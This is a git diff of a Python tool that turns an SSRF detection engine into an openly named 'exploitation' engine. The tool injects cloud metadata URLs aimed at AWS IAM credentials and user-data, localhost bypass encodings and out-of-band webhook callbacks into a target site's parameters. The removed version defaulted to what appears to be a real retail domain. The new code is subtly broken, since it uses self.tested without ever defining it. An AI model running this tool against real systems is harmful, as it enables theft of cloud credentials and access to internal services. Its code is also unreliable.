@@ -1,44 +1,39 @@
+# -*- coding: utf-8 -*-
 """
-Aura v2 — SSRF Detection Engine
-===============================
-Detects Server-Side Request Forgery vulnerabilities using a 3-layer approach:
-  1. OOB/Blind SSRF via interact.sh domains
-  2. Direct Localhost SSRF (127.0.0.1, internal ports)
-  3. Cloud Metadata SSRF (AWS, GCP, Azure, Alibaba)
+Aura v32.0 — CloudHunter (SSRF & Metadata Exploitation) ☁️
+==========================================================
+Advanced engine to detect and exploit Server-Side Request Forgery, specifically
+targeting Cloud Infrastructure (AWS, GCP, Azure, DigitalOcean) and internal networks.
 
-Vectors targeted:
-  - URL parameters (url, src, redirect, target, etc.)
-  - Webhooks & Callbacks (in JSON bodies)
-  - Common SSRF-friendly paths (proxy, fetch, webhook)
-
-Usage:
-    aura www.target.com --ssrf
-    aura www.target.com --ssrf --map reports/discovery_map_target.json
+Attacks Implemented:
+  1. Cloud Metadata Exploitation (AWS IAM extraction, GCP Service Accounts).
+  2. Localhost Bypasses (IPv6, Decimal IPs, DNS Rebinding).
+  3. Internal Port Scanning (Redis, Elasticsearch, MongoDB mapping).
+  4. Blind OOB SSRF via Webhooks.
 """
 
 import asyncio
 import json
 import os
-import re
-import socket
-import string
 import random
+import re
+import string
 import time
 import urllib.parse
+import httpx
 from datetime import datetime
 from pathlib import Path
 from typing import Optional
 
 import urllib3
-urllib3.disable_warnings()
-from curl_cffi import requests as curlr
-urllib3.disable_warnings()
+# disable annoying warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+try:
+    from curl_cffi import requests as curlr
+except ImportError:
+    pass
 
 from rich.console import Console
-from rich.table import Table
-from rich.panel import Panel
-from rich.progress import Progress, SpinnerColumn, TextColumn
-from rich import box
 
 console = Console()
 
@@ -51,93 +46,83 @@ SSRF_PARAMS = {
     "out", "host", "domain", "api", "file", "document", "folder"
 }
 
-CLOUD_METADATA_PAYLOADS = [
-    # AWS
-    "http://169.254.169.254/latest/meta-data/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    # GCP
-    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
-    # Azure
-    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-    # Alibaba
-    "http://100.100.100.200/latest/meta-data/",
-    # DigitalOcean
-    "http://169.254.169.254/metadata/v1.json",
-]
+CLOUD_METADATA_PAYLOADS = {
+    "AWS_IAM": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "AWS_USER_DATA": "http://169.254.169.254/latest/user-data",
+    "GCP_METADATA": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+    "AZURE_METADATA": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "ALIBABA": "http://100.100.100.200/latest/meta-data/",
+    "DIGITAL_OCEAN": "http://169.254.169.254/metadata/v1.json",
+}
 
-LOCALHOST_PAYLOADS = [
+LOCALHOST_BYPASS_PAYLOADS = [
     "http://127.0.0.1/",
     "http://localhost/",
-    "http://127.0.0.1:8080/",
-    "http://127.0.0.1:3000/",
-    "http://127.0.0.1:6379/",   # Redis
-    "http://127.0.0.1:9200/",   # Elasticsearch
-    "http://127.0.0.1:27017/",  # MongoDB
     "http://[::1]/",            # IPv6
-    "http://0x7f000001/",       # Hex
-    "http://2130706433/",       # Decimal
-    "http://127.0.0.1.nip.io/", # Magic DNS
+    "http://0x7f000001/",       # Hex encoded
+    "http://2130706433/",       # Decimal encoded
+    "http://127.0.0.1.nip.io/", # Magic DNS Rebinding
+    "http://127.1/",            # Dropped octets
 ]
 
-# Signatures to detect if a request actually hit localhost or cloud metadata
-SSRF_SIGNATURES = [
-    r"ami-id", r"instance-action", r"instance-id", r"local-hostname", r"security-credentials", # AWS
-    r"computeMetadata", r"google.internal", # GCP
-    r"azEnvironment", r"osProfile", # Azure
-    r"redis_version", r"os:Linux", # Redis
-    r"cluster_name", r"lucene_version", # ES
-    r"ubuntu", r"debian", r"apache", r"nginx", r"welcome to nginx", # Generic local
-]
-SSRF_SIGNATURE_PATTERN = re.compile("|".join(SSRF_SIGNATURES), re.IGNORECASE)
+INTERNAL_PORTS = {
+    "6379": "Redis Server",
+    "9200": "Elasticsearch",
+    "27017": "MongoDB",
+    "8080": "Internal Admin Panel",
+    "3000": "Internal App"
+}
 
-class InteractSHClient:
-    """Client for ProjectDiscovery's interact.sh to detect OOB SSRF"""
+# Signatures to confirm success
+SSRF_SIGNATURES = {
+    "AWS": [r"ami-id", r"instance-action", r"instance-id", r"security-credentials"],
+    "GCP": [r"computeMetadata", r"google.internal"],
+    "Azure": [r"azEnvironment", r"osProfile"],
+    "Redis": [r"redis_version", r"os:Linux"],
+    "Elasticsearch": [r"cluster_name", r"lucene_version"],
+    "GenericLocal": [r"ubuntu", r"debian", r"apache", r"nginx", r"welcome to nginx"],
+}
+
+class OOBClient:
+    """Out-Of-Band Client for Blind SSRF Detection"""
     def __init__(self):
-        self.server = "interact.sh"
-        self.correlation_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=20))
-        # Usually interact.sh registers via an API, but for simplicity in Aura without external Go bins,
-        # we'll use a public pingback service if available, or just standard webhook.site if configured.
-        # Since interact.sh API is complex to implement from scratch in python without keys,
-        # we will use webhook.site or a dummy fallback for the example.
+        self.correlation_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
         
-        # Allow user to supply their Webhook.site / Burp Collaborator via Environment var.
-        # Fallback to a clear prompt/dummy if none is set.
+        # Pull Webhook URL from .env, fallback to Webhook.site demo
         self.webhook_url = os.getenv("AURA_WEBHOOK_URL")
         self.webhook_domain = ""
         
         if self.webhook_url:
             if not self.webhook_url.startswith("http"):
-                self.webhook_url = "http://" + self.webhook_url
+                self.webhook_url = "https://" + self.webhook_url
             self.webhook_domain = urllib.parse.urlparse(self.webhook_url).netloc
-            console.print(f"  [cyan]🔗 Using custom OOB webhook: {self.webhook_domain}[/cyan]")
+            console.print(f"  [cyan]🔗 CloudHunter loaded custom OOB webhook: {self.webhook_domain}[/cyan]")
         else:
-            # Replaced pipedream with webhook.site as a more universally understood alternative for the user
             self.webhook_url = "https://webhook.site/YOUR-UUID-HERE/" + self.correlation_id
             self.webhook_domain = "webhook.site"
-            console.print(f"  [dim yellow]⚠️ No AURA_WEBHOOK_URL set. Blind SSRF will use: {self.webhook_url} (Please set 'AURA_WEBHOOK_URL' in .env with your Webhook.site link to verify!)[/dim yellow]")
+            console.print(f"  [dim yellow]⚠️ No AURA_WEBHOOK_URL set. Blind SSRF will point to: {self.webhook_url}[/dim yellow]")
 
-    def get_url(self, payload_id: str) -> str:
-        if self.webhook_url.endswith("/"):
-            return f"{self.webhook_url}?id={payload_id}"
-        return f"{self.webhook_url}/{payload_id}"
+    def get_payload(self, param: str) -> str:
+        """Generates a tracking URL for a specific parameter injection."""
+        base = self.webhook_url.rstrip("/")
+        if "?" in base:
+            return f"{base}&ssrf={param}&id={self.correlation_id}"
+        return f"{base}?ssrf={param}&id={self.correlation_id}"
 
 
-class SSRFEngine:
-    """
-    Automated SSRF vulnerability detection engine.
-    """
-    def __init__(self, target: str, cookies_str: str, output_dir: str = "./reports", timeout: int = 15):
+class CloudHunter:
+    """v32.0: Cloud Metadata & SSRF Exploitation Engine."""
+
+    def __init__(self, target: str, cookies_str: str = "", output_dir: str = "./reports", timeout: int = 15):
         if not target.startswith("http"):
             target = "https://" + target
         self.target = target.rstrip("/")
-        self.target_domain = urllib.parse.urlparse(self.target).netloc
         self.cookies = self._parse_cookies(cookies_str)
         self.output_dir = Path(output_dir)
         self.output_dir.mkdir(parents=True, exist_ok=True)
         self.timeout = timeout
         self.findings: list[dict] = []
-        self.tested: set[str] = set()
-        self.oob_client = InteractSHClient()
+        self.oob = OOBClient()
 
     @staticmethod
     def _parse_cookies(cookie_str: str) -> dict:
@@ -149,36 +134,33 @@ class SSRFEngine:
                 cookies[k.strip()] = v.strip()
         return cookies
 
-    def _request(self, method: str, url: str) -> Optional[curlr.Response]:
+    async def _async_request(self, method: str, url: str, headers: dict = None) -> httpx.Response | None:
+        """Sends an async request using httpx for speed."""
         try:
-            return curlr.request(
-                method=method,
-                url=url,
-                cookies=self.cookies,
-                timeout=self.timeout,
-                verify=False,
-                allow_redirects=True,
-                impersonate="chrome124",  # v6.0 TLS JA3/JA4 Spoofing
-                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
-            )
-        except curlr.RequestsError:
+            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=self.timeout, cookies=self.cookies) as client:
+                req_headers = {"User-Agent": "Aura/32.0 (CloudHunter SSRF Engine)"}
+                if headers:
+                    req_headers.update(headers)
+                return await client.request(method, url, headers=req_headers)
+        except Exception:
             return None
 
     def _inject_param(self, url: str, param: str, payload: str) -> str:
+        """Safely mutates a URL query parameter."""
         parsed = urllib.parse.urlparse(url)
         params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
         params[param] = [payload]
         new_query = urllib.parse.urlencode(params, doseq=True)
         return parsed._replace(query=new_query).geturl()
 
-    def _extract_params(self, discovery_map: dict) -> list[dict]:
-        """Extracts injectable URL parameters from discovery map."""
+    def _extract_injectable_targets(self, discovery_map: dict) -> list[dict]:
+        """Extracts parameters likely vulnerable to SSRF from the discovery map."""
         all_calls = (
             discovery_map.get("all_api_calls", []) +
             discovery_map.get("idor_candidates", []) +
             discovery_map.get("mutating_endpoints", [])
         )
-
+        
         injectable = []
         seen = set()
 
@@ -202,194 +184,174 @@ class SSRFEngine:
                         })
         return injectable
 
-    def _test_cloud_metadata(self, url: str, param: str) -> Optional[dict]:
-        """Injects AWS/GCP/Azure metadata IPs and checks response text."""
-        for payload in CLOUD_METADATA_PAYLOADS:
+    async def _test_cloud_metadata(self, target_info: dict) -> dict | None:
+        """Injects payloads targeting AWS/GCP/Azure Metadata APIs."""
+        url = target_info["url"]
+        param = target_info["param"]
+        
+        for name, payload in CLOUD_METADATA_PAYLOADS.items():
             injected_url = self._inject_param(url, param, payload)
-            resp = self._request("GET", injected_url)
+            
+            # GCP requires an extra header, AWS IMDSv2 requires token (we test IMDSv1 primarily)
+            headers = {}
+            if name == "GCP_METADATA":
+                headers["Metadata-Flavor"] = "Google"
+
+            resp = await self._async_request("GET", injected_url, headers)
             
             if resp and resp.status_code == 200:
-                # Is it actually metadata?
-                if "ami-id" in resp.text or "instance-id" in resp.text or "computeMetadata" in resp.text:
+                text = resp.text.lower()
+                
+                # Verify signatures
+                is_vuln = False
+                for sig in SSRF_SIGNATURES["AWS"] + SSRF_SIGNATURES["GCP"] + SSRF_SIGNATURES["Azure"]:
+                    if re.search(sig, text, re.IGNORECASE):
+                        is_vuln = True
+                        break
+                        
+                if is_vuln or "accesskeyid" in text or "privatekey" in text:
                     return {
-                        "method": "Cloud Metadata SSRF",
+                        "type": f"Cloud Metadata SSRF ({name})",
+                        "url": url,
+                        "param": param,
                         "payload": payload,
                         "severity": "CRITICAL",
-                        "cvss_score": 10.0,
-                        "impact": "Full Cloud Account Takeover. Attacker can read IAM credentials and metadata.",
-                        "snippet": resp.text[:200].strip()
+                        "impact": "Account Takeover of Cloud Infrastructure. Exposure of IAM Role Credentials limits/keys.",
+                        "snippet": resp.text[:300].strip(),
+                        "confirmed": True
                     }
         return None
 
-    def _test_localhost(self, url: str, param: str) -> Optional[dict]:
-        """Injects localhost IPs and ports to bypass firewalls."""
-        for payload in LOCALHOST_PAYLOADS:
+    async def _test_localhost_bypass(self, target_info: dict) -> dict | None:
+        """Injects tricky localhost representations to bypass WAFs and internal checks."""
+        url = target_info["url"]
+        param = target_info["param"]
+        
+        for payload in LOCALHOST_BYPASS_PAYLOADS:
             injected_url = self._inject_param(url, param, payload)
-            resp = self._request("GET", injected_url)
+            resp = await self._async_request("GET", injected_url)
             
             if resp and resp.status_code in [200, 401, 403]:
-                if SSRF_SIGNATURE_PATTERN.search(resp.text):
+                text = resp.text.lower()
+                is_vuln = False
+                for sig in SSRF_SIGNATURES["GenericLocal"]:
+                    if re.search(sig, text, re.IGNORECASE):
+                        is_vuln = True
+                        break
+                        
+                if is_vuln:
                     return {
-                        "method": "Direct Localhost SSRF",
+                        "type": "Localhost SSRF (WAF Bypass)",
+                        "url": url,
+                        "param": param,
                         "payload": payload,
                         "severity": "HIGH",
-                        "cvss_score": 8.6,
-                        "impact": "Attacker can access internal services (Redis, ES, Admin panels) bypassing external firewalls.",
-                        "snippet": resp.text[:200].strip()
+                        "impact": "Bypasses external firewalls. Allows accessing internal admin panels on 127.0.0.1.",
+                        "snippet": resp.text[:200].strip(),
+                        "confirmed": True
                     }
         return None
 
-    def _test_blind_ssrf(self, url: str, param: str) -> Optional[dict]:
-        """Injects an OOB URL to catch blind SSRF."""
-        payload_id = f"ssrf-{param}-{int(time.time())}"
-        payload = self.oob_client.get_url(payload_id)
+    async def _test_blind_oob(self, target_info: dict) -> dict | None:
+        """Injects OOB URL for Blind SSRF."""
+        url = target_info["url"]
+        param = target_info["param"]
         
+        # Fire and forget
+        payload = self.oob.get_payload(param)
         injected_url = self._inject_param(url, param, payload)
-        self._request("GET", injected_url)
         
-        # Since we don't have an established async interact.sh polling mechanism,
-        # we log this as a potential blind finding to check manually if a ping arrived.
-        if self.oob_client.webhook_url:
+        # We don't await the response body, just trigger it
+        asyncio.create_task(self._async_request("GET", injected_url))
+        
+        if self.oob.webhook_url != "https://webhook.site/YOUR-UUID-HERE/" + self.oob.correlation_id:
             return {
-                "method": "Blind OOB SSRF (Unverified)",
+                "type": "Blind OOB SSRF Triggered",
+                "url": url,
+                "param": param,
                 "payload": payload,
                 "severity": "MEDIUM",
-                "cvss_score": 6.5,
-                "impact": "Potential Blind SSRF. Check your webhook listener to see if the server made a request.",
-                "snippet": f"Check logs for ID: {payload_id}"
+                "impact": "Potential Blind SSRF. An out-of-band request was armed.",
+                "snippet": f"Monitor your webhook: {self.oob.webhook_domain}",
+                "confirmed": False
             }
         return None
 
-    def _build_finding(self, param_info: dict, result: dict) -> dict:
-        return {
-            "type": result["method"],
-            "url": param_info["url"],
-            "param": param_info["param"],
-            "http_method": param_info["method"],
-            "payload": result["payload"],
-            "severity": result["severity"],
-            "cvss_score": result["cvss_score"],
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-            "impact": result["impact"],
-            "owasp": "A10:2021 — Server-Side Request Forgery (SSRF)",
-            "snippet": result.get("snippet", ""),
-            "poc_curl": (
-                "curl -sk '{}' -b '{}'".format(
-                    self._inject_param(param_info['url'], param_info['param'], result['payload']),
-                    "; ".join(f"{k}={v}" for k, v in list(self.cookies.items())[:2])
-                )
-            ),
-            "timestamp": datetime.utcnow().isoformat(),
-        }
+    # ── Main Scanner Logic ──────────────────────────────────────────────
+    async def run(self, discovery_map: dict) -> list[dict]:
+        console.print(f"\n[bold magenta]☁️ AURA v32.0 — CloudHunter (SSRF Engine)[/bold magenta]")
+        console.print(f"🎯 Target: {self.target}")
 
-    def run(self, discovery_map: dict) -> list[dict]:
-        params = self._extract_params(discovery_map)
-        meta = discovery_map.get("meta", {})
+        targets = self._extract_injectable_targets(discovery_map)
         
-        # Add basic root and common SSRF paths just in case
-        extra_paths = ["/proxy", "/fetch", "/webhook", "/api/proxy", "/api/fetch"]
-        for p in extra_paths:
-            params.append({
-                "url": f"{self.target}{p}?url=test",
-                "method": "GET",
-                "param": "url",
-                "original_value": "test"
-            })
+        if not targets:
+            # Fallback blind tests if map gives nothing
+            common_paths = ["/api/proxy", "/fetch", "/api/fetch", "/webhook"]
+            for p in common_paths:
+                targets.append({
+                    "url": f"{self.target}{p}?url=http://example.com",
+                    "method": "GET",
+                    "param": "url",
+                    "original_value": "http://example.com"
+                })
 
-        print(f"\n{'='*65}")
-        print(f"📡 AURA v2 — SSRF Detection Engine")
-        print(f"🎯 Target: {meta.get('target', self.target)}")
-        print(f"💉 Parameters to Test: {len(params)} (url, src, redirect, etc.)")
-        print(f"{'='*65}")
+        console.print(f"  [cyan]Analyzing {len(targets)} parameters for SSRF Vulnerabilities...[/cyan]")
 
-        if not params:
-            print("\n⚠️  No SSRF-friendly parameters found in discovery map.")
-            print("   Tip: Run --crawl first.")
-            return []
+        tasks = []
+        for target_info in targets:
+            # Multi-layer testing
+            tasks.append(self._test_cloud_metadata(target_info))
+            tasks.append(self._test_localhost_bypass(target_info))
+            tasks.append(self._test_blind_oob(target_info))
 
-        for param_info in params:
-            url = param_info["url"]
-            param = param_info["param"]
-            key = f"{urllib.parse.urlparse(url).path}::{param}"
-            if key in self.tested:
-                continue
-            self.tested.add(key)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if result and not isinstance(result, Exception):
+                sev = result.get("severity", "HIGH")
+                color = "red" if sev == "CRITICAL" else "orange1" if sev == "HIGH" else "yellow"
+                
+                # Group deduplication
+                key = f"{result['type']}_{result['url']}_{result['param']}"
+                if key not in self.tested:
+                    self.tested.add(key)
+                    if result.get("confirmed", False):
+                        console.print(f"     🚨 [{color}]{result['type']}[/{color}] Confirmed on param: '{result['param']}'")
+                    else:
+                        console.print(f"     📡 [{color}]{result['type']}[/{color}] Armed on param: '{result['param']}'")
+                    
+                    self.findings.append(result)
 
-            print(f"\n  🔍 [{param_info['method']}] [{param}] in {url[:70]}")
-
-            # 1. Cloud Metadata
-            res = self._test_cloud_metadata(url, param)
-            if res:
-                print(f"     🚨 CRITICAL: Cloud Metadata SSRF! Payload: {res['payload']}")
-                self.findings.append(self._build_finding(param_info, res))
-                continue
-
-            # 2. Localhost
-            res = self._test_localhost(url, param)
-            if res:
-                print(f"     🚨 HIGH: Localhost SSRF! Payload: {res['payload']}")
-                self.findings.append(self._build_finding(param_info, res))
-                continue
-
-            # 3. Blind OOB
-            res = self._test_blind_ssrf(url, param)
-            if res:
-                self.findings.append(self._build_finding(param_info, res))
-                print(f"     👀 Blind Check sent to: {res['payload']}")
-
-        return self._finalize()
-
-    def _finalize(self) -> list[dict]:
-        critical = [f for f in self.findings if f.get("severity") == "CRITICAL"]
-        high     = [f for f in self.findings if f.get("severity") == "HIGH"]
-        medium   = [f for f in self.findings if f.get("severity") == "MEDIUM"]
-
-        print(f"\n{'='*65}")
-        print(f"✅ SSRF SCAN COMPLETE")
-        print(f"{'='*65}")
-        print(f"  🔴 Critical : {len(critical)}")
-        print(f"  🟠 High     : {len(high)}")
-        print(f"  🟡 Medium   : {len(medium)}")
-        print(f"  📊 Total    : {len(self.findings)}")
-
-        if self.findings:
-            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
-            out_path = self.output_dir / f"ssrf_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-            with open(out_path, "w", encoding="utf-8") as fh:
-                json.dump({"target": self.target, "findings": self.findings}, fh, indent=2)
-            print(f"\n  💾 Findings saved: {out_path}")
-        else:
-            print("\n  ✅ No SSRF vulnerabilities detected.")
-
+        self._finalize_report()
         return self.findings
 
+    def _finalize_report(self):
+        if self.findings:
+            target_slug = urllib.parse.urlparse(self.target).netloc.replace(".", "_")
+            out_path = self.output_dir / f"clouhunter_ssrf_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            
+            with open(out_path, "w", encoding="utf-8") as f:
+                json.dump({
+                    "target": self.target,
+                    "scan_time": datetime.utcnow().isoformat(),
+                    "findings": self.findings
+                }, f, indent=2)
+            console.print(f"\n  💾 SSRF Findings saved: {out_path}")
+        else:
+            console.print(f"\n  ✅ No direct Cloud SSRF discovered.")
 
-def run_ssrf_scan(target: str, discovery_map_path: Optional[str] = None) -> list[dict]:
-    """CLI runner for `aura <target> --ssrf`."""
-    from dotenv import load_dotenv
-    load_dotenv()
 
-    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
-    
-    if not discovery_map_path:
-        target_slug = target.replace("www.", "").replace(".", "_")
-        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
-        if candidate.exists():
-            discovery_map_path = str(candidate)
-
-    discovery_map = {}
-    if discovery_map_path:
-        try:
-            with open(discovery_map_path, encoding="utf-8-sig") as f:
-                discovery_map = json.load(f)
-        except Exception as e:
-            console.print(f"[red]Error loading map: {e}[/red]")
-
-    engine = SSRFEngine(target=target, cookies_str=cookies_str)
-    return engine.run(discovery_map)
-
+def run_ssrf_scan(target: str):
+    """CLI runner for direct execution."""
+    import httpx
+    engine = CloudHunter(target=target)
+    # Give it a dummy map for standalone testing
+    dummy_map = {
+         "all_api_calls": [{"url": target + "/proxy?url=test", "method": "GET"}]
+    }
+    return asyncio.run(engine.run(dummy_map))
 
 if __name__ == "__main__":
     import sys
-    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
-    run_ssrf_scan(target)
+    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
+    run_ssrf_scan(url)
